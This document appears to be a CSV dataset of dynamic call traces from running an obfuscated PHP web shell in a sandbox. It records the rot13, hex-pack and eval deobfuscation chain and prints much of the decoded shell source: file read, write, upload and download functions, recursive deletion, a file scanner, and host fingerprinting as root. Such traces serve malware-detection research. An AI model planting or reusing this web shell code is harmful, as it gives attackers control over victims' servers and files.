"uuid","file_md5","index","source","target","argc","argv","return","dynamic"
"20dccba2eba7ec86990b699d2dca4dc2","a82a0625bae4b9fbcb0e5c0a85519646","0","__main__","zend_compile_file","2","{""value"": []}","{""value"": ""28413C3941413C3A3941413C3A3941413C3A413C41413C2600003C3E""}","[]"
"20dccba2eba7ec86990b699d2dca4dc2","a82a0625bae4b9fbcb0e5c0a85519646","1","__main__","error_reporting","1","{""value"": [[0, ""new_error_level"", 1]]}","{""value"": ""void""}","[0]"
"20dccba2eba7ec86990b699d2dca4dc2","a82a0625bae4b9fbcb0e5c0a85519646","2","__main__","ini_set","2","{""value"": [[0, ""varname"", ""display_errors""], [1, ""newvalue"", ""Off""]]}","{""value"": ""void""}","[0, 0]"
"20dccba2eba7ec86990b699d2dca4dc2","a82a0625bae4b9fbcb0e5c0a85519646","3","__main__","ini_set","2","{""value"": [[0, ""varname"", ""max_execution_time""], [1, ""newvalue"", 20000]]}","{""value"": ""void""}","[0, 0]"
"20dccba2eba7ec86990b699d2dca4dc2","a82a0625bae4b9fbcb0e5c0a85519646","4","__main__","ini_set","2","{""value"": [[0, ""varname"", ""memory_limit""], [1, ""newvalue"", ""256M""]]}","{""value"": ""void""}","[0, 0]"
"20dccba2eba7ec86990b699d2dca4dc2","a82a0625bae4b9fbcb0e5c0a85519646","5","__main__","header","1","{""value"": [[0, ""header"", ""content-Type: text/html; charset=utf-8""]]}","{""value"": ""void""}","[0]"
"20dccba2eba7ec86990b699d2dca4dc2","a82a0625bae4b9fbcb0e5c0a85519646","6","__main__","define","2","{""value"": [[0, ""constant_name"", ""Viv, bebegim.""], [1, ""value"", ""Denzel-\xc4\xe3\xb5\xc4\xd3\xa2\xd0\xdb""]]}","{""value"": ""void""}","[0, 0]"
"20dccba2eba7ec86990b699d2dca4dc2","a82a0625bae4b9fbcb0e5c0a85519646","7","__main__","s","0","{""value"": []}","{""value"": ""void""}","[]"
"20dccba2eba7ec86990b699d2dca4dc2","a82a0625bae4b9fbcb0e5c0a85519646","8","s","str_rot13","1","{""value"": [[0, ""str"", ""66756r6374696s6r20737472646972282473747229207o2072657475726r207374725s7265706p61636528617272617928275p5p272p272s2s272p27253237272p""]]}","{""value"": ""66756e6374696f6e20737472646972282473747229207b2072657475726e207374725f7265706c61636528617272617928275c5c272c272f2f272c27253237272c""}","[0]"
"20dccba2eba7ec86990b699d2dca4dc2","a82a0625bae4b9fbcb0e5c0a85519646","9","s","pack","2","{""value"": [[0, ""format"", ""H*""], [1, ""args"", ""66756e6374696f6e20737472646972282473747229207b2072657475726e207374725f7265706c61636528617272617928275c5c272c272f2f272c27253237272c""]]}","{""value"": ""function strdir($str) { return str_replace(array('\\','//','%27','%22'),array('/','/','\'','""'),chop($str)); }
function chkgpc($a""}","[0, 0]"
"20dccba2eba7ec86990b699d2dca4dc2","a82a0625bae4b9fbcb0e5c0a85519646","10","s","m","1","{""value"": [[0, ""str"", ""66756e6374696f6e20737472646972282473747229207b2072657475726e207374725f7265706c61636528617272617928275c5c272c272f2f272c27253237272c""]]}","{""value"": ""void""}","[0]"
"20dccba2eba7ec86990b699d2dca4dc2","a82a0625bae4b9fbcb0e5c0a85519646","11","m","str_ireplace","3","{""value"": [[0, ""search"", ""/*123*/asdasdasd/*123*/""], [1, ""replace"", """"], [2, ""subject"", ""/*123*/asdasdasd/*123*/""]]}","{""value"": """"}","[0, 0, 0]"
"20dccba2eba7ec86990b699d2dca4dc2","a82a0625bae4b9fbcb0e5c0a85519646","12","m","str_ireplace","3","{""value"": [[0, ""search"", ""/*123*/asdasdasd/*123*/""], [1, ""replace"", """"], [2, ""subject"", ""/*123*/asdasdasd/*123*/""]]}","{""value"": """"}","[0, 0, 0]"
"20dccba2eba7ec86990b699d2dca4dc2","a82a0625bae4b9fbcb0e5c0a85519646","13","m","eval","1","{""value"": [[0, ""phpcode"", ""function strdir($str) { return str_replace(array('\\','//','%27','%22'),array('/','/','\'','""'),chop($str)); }
function chkgpc($a""]]}","{""value"": ""void""}","[0]"
"20dccba2eba7ec86990b699d2dca4dc2","a82a0625bae4b9fbcb0e5c0a85519646","14","eval","zend_compile_string","2","{""value"": [[0, ""source_string"", ""function strdir($str) { return str_replace(array('\\','//','%27','%22'),array('/','/','\'','""'),chop($str)); }
function chkgpc($array) { foreach($array as $key => $var) { $array[$key] = is_array($var) ? chkgpc($var) : stripslashes($var); } return $array; }
$myfile = $_SERVER['SCRIPT_FILENAME'] ? strdir($_SERVER['SCRIPT_FILENAME']) : strdir(__FILE__);
$myfile = strpos($myfile,'eval()') ? array_shift(explode('(',$myfile)) : $myfile;
define('THISDIR',strdir(dirname($myfile).'/'));
define('ROOTDIR',strdir(strtr($myfile,array(strdir($_SERVER['PHP_SELF']) => '')).'/'));
define('EXISTS_PHPINFO',getinfo() ? true : false);
if(get_magic_quotes_gpc()) { $_POST = chkgpc($_POST); }
if(function_exists('mysql_close')) { $issql = 'MySql'; }
if(function_exists('mssql_close')) $issql .= ' - MsSql';
if(function_exists('oci_close')) $issql .= ' - Oracle';
if(function_exists('sybase_close')) $issql .= ' - SyBase';
if(function_exists('pg_close')) $issql .= ' - PostgreSql';
$win = substr(PHP_OS,0,3) == 'WIN' ? true : false;
$msg = VERSION;

function filew($filename,$filedata,$filemode) {
	if((!is_writable($filename)) && file_exists($filename)) { chmod($filename,0666); }
	$handle = fopen($filename,$filemode);
	$key = fputs($handle,$filedata);
	fclose($handle);
	return $key;
}

function filer($filename) {
	$handle = fopen($filename,'r');
	$filedata = fread($handle,filesize($filename));
	fclose($handle);
	return $filedata;
}

function fileu($filenamea,$filenameb) {
	$key = move_uploaded_file($filenamea,$filenameb) ? true : false;
	if(!$key) { $key = copy($filenamea,$filenameb) ? true : false; }
	return $key;
}

function filed($filename) {
	if(!file_exists($filename)) return false;
	ob_end_clean();
	$name = basename($filename);
	$array = explode('.',$name);
	header('Content-type: application/x-'.array_pop($array));
	header('Content-Disposition: attachment; filename='.$name);
	header('Content-Length: '.filesize($filename));
	@readfile($filename);
	exit;
}

function showdir($dir) {
	$dir = strdir($dir.'/');
	if(($handle = @opendir($dir)) == NULL) return false;
	$array = array();
	while(false !== ($name = readdir($handle))) {
		if($name == '.' || $name == '..') continue;
		$path = $dir.$name;
		$name = strtr($name,array('\'' => '%27','""' => '%22'));
		if(is_dir($path)) { $array['dir'][$path] = $name; }
		else { $array['file'][$path] = $name; }
	}
	closedir($handle);
	return $array;
}

function deltree($dir) {
	$handle = @opendir($dir);
	while(false !== ($name = @readdir($handle))) {
		if($name == '.' || $name == '..') continue;
		$path = $dir.$name;
		@chmod($path,0777);
		if(is_dir($path)) { deltree($path.'/'); }
		else { @unlink($path); }
	}
	@closedir($handle);
	return @rmdir($dir);
}

function size($bytes) {
	if($bytes < 1024) return $bytes.' B';
	$array = array('B','K','M','G','T');
	$floor = floor(log($bytes) / log(1024));
	return sprintf('%.2f '.$array[$floor],($bytes/pow(1024,floor($floor))));
}

function find($array,$string) {
	foreach($array as $key) { if(stristr($string,$key)) return true; }
	return false;
}

function scanfile($dir,$key,$inc,$fit,$tye,$chr,$ran,$now) {
	if(($handle = @opendir($dir)) == NULL) return false;
	while(false !== ($name = readdir($handle))) {
		if($name == '.' || $name == '..') continue;
		$path = $dir.$name;
		if(is_dir($path)) { if($fit && in_array($name,$fit)) continue; if($ran == 0 && is_readable($path)) scanfile($path.'/',$key,$inc,$fit,$tye,$chr,$ran,$now); }
		else {
			if($inc && (!find($inc,$name))) continue;
			$code = $tye ? filer($path) : $name;
			$find = $chr ? stristr($code,$key) : (strpos(size(filesize($path)),'M') ? false : (strpos($code,$key) > -1));
			if($find) {
				$file = strtr($path,array($now => '','\'' => '%27','""' => '%22'));
				echo '<a href=""javascript:go(\'editor\',\''.$file.'\');"">\xe7\xbc\x96\xe8\xbe\x91</a> '.$path.'<br>';
				flush(); ob_flush();
			}
			unset($code);
		}
	}
	closedir($handle);
	return true;
}

function antivirus($dir,$exs,$matches,$now) {
	if(($handle = @opendir($dir)) ""]]}","{""value"": ""000050512B5051423C9D2A413C9D2642413C2B41423C6A3C9D2A9D2641423C08413C6A3C41425051423C47413C08413C6A3C413B3D2B162A16413C3C2B50423C53262A413C2B262A413C2B1E2A413C2B1E2A413C2B1E2A413C2B1E2A4141413C112B162A1626632600000000000000000000000000000059732B5051112B505108505108413C2626423C0D2B262A2A2A286308413C6A3C0808282850512B50519D2A5051423C9D083C08083C08083C08083C080828722B0808282A28474848484848484826505142423C2B50519D2A9D2659732B5051423C08413C9D2A639D26284D4E892626112B162A1608080808423C08080808282A3128283C2808082828285051302B632B3C413C3C263C47264142433C51512651512B5151085151089D2A51519D262A505147413C2B413C9D2A9D48413C2B413C9D2A9D482B9D2A9D483C48483C4850514850514850514850514850514850514850512B50519D2A9D48413C6A3C48413C6A3C48413C48413C48413C48413C0848413C2B162A1648413C2B162A1648413C2B162A1648413C2B162A1648413C2B162A1648413C2B162A1648413C2B162A1648413C2B162A1648413C2B162A1648413C2B162A1648413C2B162A1648413C2B162A1648413C2B162A1648413C2B162A1648413C2B162A1648413C2B162A1648413C2B162A16482B9D2A9D4826080828284D4E89262608080808282A3128322A302B2B162A162647482659732B50519D2A9D2659732B505126112B63162A162642423C262A51080828283C28423C080828284748264D4E8926260808112B162A1608080808282A31282828413C0808630808282828282828282828282828282828282828282828282851423C080828322A302B59732B5051423C9D2A9D2659732B50519D2A9D2659732B5051423C9D2A9D2659732B5051423C9D2A9D26080828283C2828423C080828423C080828423C080828423C08082850512B162A1608082850512B162A1608082850512B162A1608082850512B162A1608082850512B162A160808282828122B3C3C28112B9D2A41423C9D26112B9D2A41423C9D2608413C6A424242505142505142505142423C262B162A160808282A322A302B59732B5051423C9D2A9D2659732B50519D2A479D26080828283C2828423C08082828474848264D4E89262608080808080851112B162A1608080808282A3128285051423C132B474747484748263C3C2808413C6A4242423C262B162A160808282A322A302B59732B5051423C263C4241413C112E42413C11342B39500808493A2A3950493A3C263C2A2626413C28080828283C28423C0808282828282828286308082828282828423C080828322A302B59730D2E59730D342E59730D342B505126505126505126505126505126505126505126302B413C2B42413C2B41423C26512651262A26393B37383738373837383738413D3A262B0808263B08413D3B423D262B1E3B423D262B93892A2A1E3B423D47263B423D2A080826393B423D3A2A080826322A302B413C2B393B4242423D3A262B0808263B42423D3B423D262B1E3B423D262B93892A2A1E393B423D3A2A080826393B423D3A2A080826322A302B413C2B393B42420808413D3A262B0808263B42423D263B423D2B1E3B4263413D262B93892A2A1E3B3D265147263B423D2A3B3D26514726080826393B423D3A2A080826322A302B413C2B3B42413C2B9D2A089D6A4242423D262B0808264241413C112B472626264142433C51512E5151342E5151342E5151342B3B5D5D42423D3B0841423D5151080851510808263B42423D262B3B4263413D262B41423C081E24462A2B5151423C264242413C2B162A161E47423C6A3C080848262A1E2A1E3B3D473B3D48262A1E2A720D2B3B42423D3B0841423D3B42423D262B1E3B4263413D262B93892A2A1E3B3D473B3D48262A3B423D2A0808263B3D473B3D48263B423D2A080826322A2A26262626262626080828283C28282847484848264D4E89260808112B162A1608080808282A310808280808280808280808282828282808080808282828282808082828282828286308082828423C08082828474848484848484848264D4E89260808112B162A1608080808282A3128282B283C423C3C263C41423C2E413C342B394141423C3A262A423C28282A322A302B59730D2E59730D342B50512650512650512B50519D2A9D26505126424242423C262A26262626080828283C2828080828080808082808082828474848484848264D4E8926260808112B162A1608080808282A312828322A302B2A302B505108505108413C26413C26423C0D2B262A423C262641423C2E342B26394141423C3A262A423C6A3C26423C6A3C6A413C08080808080826413C28080828283C28423C0808280808282B284748264D4E8926260808112B162A1608080808282A31282A423C08082828423C0808283C28322A302B59732B50519D2A50519D26413C0808413C0808262659732E5973342B505126472626132D24462A5151112B505151112B51519D2A5051519D265151260808413C2642423C2B0808162A08081693892A2A2A080828283C2808082826132D24462A080808080808510808282A280808283C28322A2A59732B505151112B262A5051112B5051519D2A50519D265051512608413C2642423C2B0808162A080816262A59732B5051302B50510D2B50510808262A2650514D4E8926395008413C6A50510808413C6A3C3A2B162A16172A312B080850510808162A080850510808162626322A302B50510D2B262A2650514D4E8926395008413C6A3C3A2B162A16172A312B0808162A08081626322A302B50510D2B5051""}","[0]"
"20dccba2eba7ec86990b699d2dca4dc2","a82a0625bae4b9fbcb0e5c0a85519646","15","eval","zend_fetch_r_server","1","{""value"": [[0, ""op1"", ""_SERVER""]]}","{""value"": []}","[0]"
"20dccba2eba7ec86990b699d2dca4dc2","a82a0625bae4b9fbcb0e5c0a85519646","16","eval","zend_fetch_r_server","1","{""value"": [[0, ""op1"", ""_SERVER""]]}","{""value"": []}","[0]"
"20dccba2eba7ec86990b699d2dca4dc2","a82a0625bae4b9fbcb0e5c0a85519646","17","eval","strdir","1","{""value"": [[0, ""str"", ""/usr/share/nginx/html/a82a0625bae4b9fbcb0e5c0a85519646_7a568076-fdf1-4030-b06a-bbc4aa738c05.php""]]}","{""value"": ""/usr/share/nginx/html/a82a0625bae4b9fbcb0e5c0a85519646_7a568076-fdf1-4030-b06a-bbc4aa738c05.php""}","[0]"
"20dccba2eba7ec86990b699d2dca4dc2","a82a0625bae4b9fbcb0e5c0a85519646","18","strdir","chop","1","{""value"": [[0, ""str"", ""/usr/share/nginx/html/a82a0625bae4b9fbcb0e5c0a85519646_7a568076-fdf1-4030-b06a-bbc4aa738c05.php""]]}","{""value"": ""/usr/share/nginx/html/a82a0625bae4b9fbcb0e5c0a85519646_7a568076-fdf1-4030-b06a-bbc4aa738c05.php""}","[0]"
"20dccba2eba7ec86990b699d2dca4dc2","a82a0625bae4b9fbcb0e5c0a85519646","19","strdir","str_replace","3","{""value"": [[0, ""search"", []], [1, ""replace"", []], [2, ""subject"", ""/usr/share/nginx/html/a82a0625bae4b9fbcb0e5c0a85519646_7a568076-fdf1-4030-b06a-bbc4aa738c05.php""]]}","{""value"": ""/usr/share/nginx/html/a82a0625bae4b9fbcb0e5c0a85519646_7a568076-fdf1-4030-b06a-bbc4aa738c05.php""}","[0, 0, 0]"
"20dccba2eba7ec86990b699d2dca4dc2","a82a0625bae4b9fbcb0e5c0a85519646","20","eval","strpos","2","{""value"": [[0, ""haystack"", ""/usr/share/nginx/html/a82a0625bae4b9fbcb0e5c0a85519646_7a568076-fdf1-4030-b06a-bbc4aa738c05.php""], [1, ""needle"", ""eval()""]]}","{""value"": false}","[0, 0]"
"20dccba2eba7ec86990b699d2dca4dc2","a82a0625bae4b9fbcb0e5c0a85519646","21","eval","dirname","1","{""value"": [[0, ""path"", ""/usr/share/nginx/html/a82a0625bae4b9fbcb0e5c0a85519646_7a568076-fdf1-4030-b06a-bbc4aa738c05.php""]]}","{""value"": ""/usr/share/nginx/html""}","[0]"
"20dccba2eba7ec86990b699d2dca4dc2","a82a0625bae4b9fbcb0e5c0a85519646","22","eval","strdir","1","{""value"": [[0, ""str"", ""/usr/share/nginx/html/""]]}","{""value"": ""/usr/share/nginx/html/""}","[0]"
"20dccba2eba7ec86990b699d2dca4dc2","a82a0625bae4b9fbcb0e5c0a85519646","23","strdir","chop","1","{""value"": [[0, ""str"", ""/usr/share/nginx/html/""]]}","{""value"": ""/usr/share/nginx/html/""}","[0]"
"20dccba2eba7ec86990b699d2dca4dc2","a82a0625bae4b9fbcb0e5c0a85519646","24","strdir","str_replace","3","{""value"": [[0, ""search"", []], [1, ""replace"", []], [2, ""subject"", ""/usr/share/nginx/html/""]]}","{""value"": ""/usr/share/nginx/html/""}","[0, 0, 0]"
"20dccba2eba7ec86990b699d2dca4dc2","a82a0625bae4b9fbcb0e5c0a85519646","25","eval","define","2","{""value"": [[0, ""constant_name"", ""THISDIR""], [1, ""value"", ""/usr/share/nginx/html/""]]}","{""value"": ""void""}","[0, 0]"
"20dccba2eba7ec86990b699d2dca4dc2","a82a0625bae4b9fbcb0e5c0a85519646","26","eval","zend_fetch_r_server","1","{""value"": [[0, ""op1"", ""_SERVER""]]}","{""value"": []}","[0]"
"20dccba2eba7ec86990b699d2dca4dc2","a82a0625bae4b9fbcb0e5c0a85519646","27","eval","strdir","1","{""value"": [[0, ""str"", ""/a82a0625bae4b9fbcb0e5c0a85519646_7a568076-fdf1-4030-b06a-bbc4aa738c05.php""]]}","{""value"": ""/a82a0625bae4b9fbcb0e5c0a85519646_7a568076-fdf1-4030-b06a-bbc4aa738c05.php""}","[0]"
"20dccba2eba7ec86990b699d2dca4dc2","a82a0625bae4b9fbcb0e5c0a85519646","28","strdir","chop","1","{""value"": [[0, ""str"", ""/a82a0625bae4b9fbcb0e5c0a85519646_7a568076-fdf1-4030-b06a-bbc4aa738c05.php""]]}","{""value"": ""/a82a0625bae4b9fbcb0e5c0a85519646_7a568076-fdf1-4030-b06a-bbc4aa738c05.php""}","[0]"
"20dccba2eba7ec86990b699d2dca4dc2","a82a0625bae4b9fbcb0e5c0a85519646","29","strdir","str_replace","3","{""value"": [[0, ""search"", []], [1, ""replace"", []], [2, ""subject"", ""/a82a0625bae4b9fbcb0e5c0a85519646_7a568076-fdf1-4030-b06a-bbc4aa738c05.php""]]}","{""value"": ""/a82a0625bae4b9fbcb0e5c0a85519646_7a568076-fdf1-4030-b06a-bbc4aa738c05.php""}","[0, 0, 0]"
"20dccba2eba7ec86990b699d2dca4dc2","a82a0625bae4b9fbcb0e5c0a85519646","30","eval","strtr","2","{""value"": [[0, ""str"", ""/usr/share/nginx/html/a82a0625bae4b9fbcb0e5c0a85519646_7a568076-fdf1-4030-b06a-bbc4aa738c05.php""], [1, ""from"", []]]}","{""value"": ""/usr/share/nginx/html""}","[0, 0]"
"20dccba2eba7ec86990b699d2dca4dc2","a82a0625bae4b9fbcb0e5c0a85519646","31","eval","strdir","1","{""value"": [[0, ""str"", ""/usr/share/nginx/html/""]]}","{""value"": ""/usr/share/nginx/html/""}","[0]"
"20dccba2eba7ec86990b699d2dca4dc2","a82a0625bae4b9fbcb0e5c0a85519646","32","strdir","chop","1","{""value"": [[0, ""str"", ""/usr/share/nginx/html/""]]}","{""value"": ""/usr/share/nginx/html/""}","[0]"
"20dccba2eba7ec86990b699d2dca4dc2","a82a0625bae4b9fbcb0e5c0a85519646","33","strdir","str_replace","3","{""value"": [[0, ""search"", []], [1, ""replace"", []], [2, ""subject"", ""/usr/share/nginx/html/""]]}","{""value"": ""/usr/share/nginx/html/""}","[0, 0, 0]"
"20dccba2eba7ec86990b699d2dca4dc2","a82a0625bae4b9fbcb0e5c0a85519646","34","eval","define","2","{""value"": [[0, ""constant_name"", ""ROOTDIR""], [1, ""value"", ""/usr/share/nginx/html/""]]}","{""value"": ""void""}","[0, 0]"
"20dccba2eba7ec86990b699d2dca4dc2","a82a0625bae4b9fbcb0e5c0a85519646","35","eval","getinfo","0","{""value"": []}","{""value"": true}","[]"
"20dccba2eba7ec86990b699d2dca4dc2","a82a0625bae4b9fbcb0e5c0a85519646","36","getinfo","zend_fetch_r_post","1","{""value"": [[0, ""op1"", ""_POST""]]}","{""value"": []}","[0]"
"20dccba2eba7ec86990b699d2dca4dc2","a82a0625bae4b9fbcb0e5c0a85519646","37","getinfo","function_exists","1","{""value"": [[0, ""function_name"", ""phpinfo""]]}","{""value"": true}","[0]"
"20dccba2eba7ec86990b699d2dca4dc2","a82a0625bae4b9fbcb0e5c0a85519646","38","getinfo","setcookie","2","{""value"": [[0, ""name"", ""new""], [1, ""value"", 951]]}","{""value"": ""void""}","[0, 0]"
"20dccba2eba7ec86990b699d2dca4dc2","a82a0625bae4b9fbcb0e5c0a85519646","39","getinfo","zend_fetch_r_cookie","1","{""value"": [[0, ""op1"", ""_COOKIE""]]}","{""value"": []}","[0]"
"20dccba2eba7ec86990b699d2dca4dc2","a82a0625bae4b9fbcb0e5c0a85519646","40","getinfo","setcookie","2","{""value"": [[0, ""name"", ""new""], [1, ""value"", 95]]}","{""value"": ""void""}","[0, 0]"
"20dccba2eba7ec86990b699d2dca4dc2","a82a0625bae4b9fbcb0e5c0a85519646","41","eval","define","2","{""value"": [[0, ""constant_name"", ""EXISTS_PHPINFO""], [1, ""value"", true]]}","{""value"": ""void""}","[0, 0]"
"20dccba2eba7ec86990b699d2dca4dc2","a82a0625bae4b9fbcb0e5c0a85519646","42","eval","get_magic_quotes_gpc","0","{""value"": []}","{""value"": false}","[]"
"20dccba2eba7ec86990b699d2dca4dc2","a82a0625bae4b9fbcb0e5c0a85519646","43","eval","function_exists","1","{""value"": [[0, ""function_name"", ""mysql_close""]]}","{""value"": false}","[0]"
"20dccba2eba7ec86990b699d2dca4dc2","a82a0625bae4b9fbcb0e5c0a85519646","44","eval","function_exists","1","{""value"": [[0, ""function_name"", ""mssql_close""]]}","{""value"": false}","[0]"
"20dccba2eba7ec86990b699d2dca4dc2","a82a0625bae4b9fbcb0e5c0a85519646","45","eval","function_exists","1","{""value"": [[0, ""function_name"", ""oci_close""]]}","{""value"": false}","[0]"
"20dccba2eba7ec86990b699d2dca4dc2","a82a0625bae4b9fbcb0e5c0a85519646","46","eval","function_exists","1","{""value"": [[0, ""function_name"", ""sybase_close""]]}","{""value"": false}","[0]"
"20dccba2eba7ec86990b699d2dca4dc2","a82a0625bae4b9fbcb0e5c0a85519646","47","eval","function_exists","1","{""value"": [[0, ""function_name"", ""pg_close""]]}","{""value"": false}","[0]"
"20dccba2eba7ec86990b699d2dca4dc2","a82a0625bae4b9fbcb0e5c0a85519646","48","eval","substr","3","{""value"": [[0, ""str"", ""Linux""], [1, ""start"", 0], [2, ""length"", 3]]}","{""value"": ""Lin""}","[0, 0, 0]"
"20dccba2eba7ec86990b699d2dca4dc2","a82a0625bae4b9fbcb0e5c0a85519646","49","eval","time","0","{""value"": []}","{""value"": 1604176582}","[]"
"20dccba2eba7ec86990b699d2dca4dc2","a82a0625bae4b9fbcb0e5c0a85519646","50","eval","date","2","{""value"": [[0, ""format"", ""Y-m-d H:i:s \xe6\x98\x9f\xe6\x9c\x9fN""], [1, ""timestamp"", 1604176582]]}","{""value"": ""2020-10-31 20:36:22 \xe6\x98\x9f\xe6\x9c\x9f6""}","[0, 0]"
"20dccba2eba7ec86990b699d2dca4dc2","a82a0625bae4b9fbcb0e5c0a85519646","51","eval","zend_fetch_r_server","1","{""value"": [[0, ""op1"", ""_SERVER""]]}","{""value"": []}","[0]"
"20dccba2eba7ec86990b699d2dca4dc2","a82a0625bae4b9fbcb0e5c0a85519646","52","eval","zend_fetch_r_server","1","{""value"": [[0, ""op1"", ""_SERVER""]]}","{""value"": []}","[0]"
"20dccba2eba7ec86990b699d2dca4dc2","a82a0625bae4b9fbcb0e5c0a85519646","53","eval","php_uname","0","{""value"": []}","{""value"": ""Linux dcc9c675ada0 3.10.0-957.21.3.el7.x86_64 #1 SMP Tue Jun 18 16:35:19 UTC 2019 x86_64""}","[]"
"20dccba2eba7ec86990b699d2dca4dc2","a82a0625bae4b9fbcb0e5c0a85519646","54","eval","get_current_user","0","{""value"": []}","{""value"": ""root""}","[]"
"20dccba2eba7ec86990b699d2dca4dc2","a82a0625bae4b9fbcb0e5c0a85519646","55","eval","getmyuid","0","{""value"": []}","{""value"": 0}","[]"
"20dccba2eba7ec86990b699d2dca4dc2","a82a0625bae4b9fbcb0e5c0a85519646","56","eval","getmygid","0","{""value"": []}","{""value"": 0}","[]"
"20dccba2eba7ec86990b699d2dca4dc2","a82a0625bae4b9fbcb0e5c0a85519646","57","eval","zend_fetch_r_post","1","{""value"": [[0, ""op1"", ""_POST""]]}","{""value"": []}","[0]"
"20dccba2eba7ec86990b699d2dca4dc2","a82a0625bae4b9fbcb0e5c0a85519646","58","eval","array_key_exists","2","{""value"": [[0, ""key"", ""assert""], [1, ""search"", []]]}","{""value"": false}","[130, 0]"
"20dccba2eba7ec86990b699d2dca4dc2","a82a0625bae4b9fbcb0e5c0a85519646","59","eval","base64_encode","1","{""value"": [[0, ""str"", ""/usr/share/nginx/html/""]]}","{""value"": ""L3Vzci9zaGFyZS9uZ2lueC9odG1sLw==""}","[0]"
"20dccba2eba7ec86990b699d2dca4dc2","a82a0625bae4b9fbcb0e5c0a85519646","60","eval","base64_encode","1","{""value"": [[0, ""str"", ""/usr/share/nginx/html/""]]}","{""value"": ""L3Vzci9zaGFyZS9uZ2lueC9odG1sLw==""}","[0]"
"20dccba2eba7ec86990b699d2dca4dc2","a82a0625bae4b9fbcb0e5c0a85519646","61","eval","base64_encode","1","{""value"": [[0, ""str"", ""/usr/share/nginx/html/""]]}","{""value"": ""L3Vzci9zaGFyZS9uZ2lueC9odG1sLw==""}","[0]"
"20dccba2eba7ec86990b699d2dca4dc2","a82a0625bae4b9fbcb0e5c0a85519646","62","eval","base64_encode","1","{""value"": [[0, ""str"", ""/usr/share/nginx/html/""]]}","{""value"": ""L3Vzci9zaGFyZS9uZ2lueC9odG1sLw==""}","[0]"
"20dccba2eba7ec86990b699d2dca4dc2","a82a0625bae4b9fbcb0e5c0a85519646","63","eval","base64_encode","1","{""value"": [[0, ""str"", ""/usr/share/nginx/html/""]]}","{""value"": ""L3Vzci9zaGFyZS9uZ2lueC9odG1sLw==""}","[0]"
"20dccba2eba7ec86990b699d2dca4dc2","a82a0625bae4b9fbcb0e5c0a85519646","64","eval","base64_encode","1","{""value"": [[0, ""str"", ""/usr/share/nginx/html/""]]}","{""value"": ""L3Vzci9zaGFyZS9uZ2lueC9odG1sLw==""}","[0]"
"20dccba2eba7ec86990b699d2dca4dc2","a82a0625bae4b9fbcb0e5c0a85519646","65","eval","base64_encode","1","{""value"": [[0, ""str"", ""/usr/share/nginx/html/""]]}","{""value"": ""L3Vzci9zaGFyZS9uZ2lueC9odG1sLw==""}","[0]"
"20dccba2eba7ec86990b699d2dca4dc2","a82a0625bae4b9fbcb0e5c0a85519646","66","eval","base64_encode","1","{""value"": [[0, ""str"", ""/usr/share/nginx/html/""]]}","{""value"": ""L3Vzci9zaGFyZS9uZ2lueC9odG1sLw==""}","[0]"
"20dccba2eba7ec86990b699d2dca4dc2","a82a0625bae4b9fbcb0e5c0a85519646","67","eval","subeval","0","{""value"": []}","{""value"": ""void""}","[]"
"20dccba2eba7ec86990b699d2dca4dc2","a82a0625bae4b9fbcb0e5c0a85519646","68","subeval","zend_fetch_r_post","1","{""value"": [[0, ""op1"", ""_POST""]]}","{""value"": []}","[0]"
"20dccba2eba7ec86990b699d2dca4dc2","a82a0625bae4b9fbcb0e5c0a85519646","69","eval","zend_fetch_r_post","1","{""value"": [[0, ""op1"", ""_POST""]]}","{""value"": []}","[0]"
"20dccba2eba7ec86990b699d2dca4dc2","a82a0625bae4b9fbcb0e5c0a85519646","70","eval","fileperms","1","{""value"": [[0, ""filename"", ""/usr/share/nginx/html/""]]}","{""value"": 16877}","[0]"
"20dccba2eba7ec86990b699d2dca4dc2","a82a0625bae4b9fbcb0e5c0a85519646","71","eval","decoct","1","{""value"": [[0, ""decimal_number"", 16877]]}","{""value"": ""40755""}","[0]"
"20dccba2eba7ec86990b699d2dca4dc2","a82a0625bae4b9fbcb0e5c0a85519646","72","eval","substr","2","{""value"": [[0, ""str"", ""40755""], [1, ""start"", -4]]}","{""value"": ""0755""}","[0, 0]"
"20dccba2eba7ec86990b699d2dca4dc2","a82a0625bae4b9fbcb0e5c0a85519646","73","eval","showdir","1","{""value"": [[0, ""dir"", ""/usr/share/nginx/html/""]]}","{""value"": []}","[0]"
"20dccba2eba7ec86990b699d2dca4dc2","a82a0625bae4b9fbcb0e5c0a85519646","74","showdir","strdir","1","{""value"": [[0, ""str"", ""/usr/share/nginx/html//""]]}","{""value"": ""/usr/share/nginx/html/""}","[0]"
"20dccba2eba7ec86990b699d2dca4dc2","a82a0625bae4b9fbcb0e5c0a85519646","75","strdir","chop","1","{""value"": [[0, ""str"", ""/usr/share/nginx/html//""]]}","{""value"": ""/usr/share/nginx/html//""}","[0]"
